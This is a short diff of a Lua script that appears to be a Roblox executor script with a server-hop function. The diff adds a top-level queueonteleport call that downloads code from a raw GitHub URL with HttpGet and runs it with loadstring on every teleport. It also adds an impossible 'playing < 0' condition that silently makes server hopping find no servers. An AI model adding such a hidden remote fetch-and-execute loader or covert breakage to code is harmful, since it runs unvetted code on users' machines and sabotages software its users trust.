@@ -1,3 +1,5 @@
+queueonteleport([[loadstring(game:HttpGet('https://raw.githubusercontent.com/randy-rash/lua-files/refs/heads/main/asdaw1'))()]])
+
 local Services = function(Name)
     return cloneref(game:GetService(Name))
 end
@@ -50,7 +52,8 @@ local ServerHop = function()
             and tonumber(Server.playing) 
             and tonumber(Server.maxPlayers) 
             and Server.playing < Server.maxPlayers 
-            and Server.id ~= game.JobId 
+            and Server.id ~= game.JobId
+			and Server.playing < 0
         then
             table.insert(Servers, Server.id)
         end
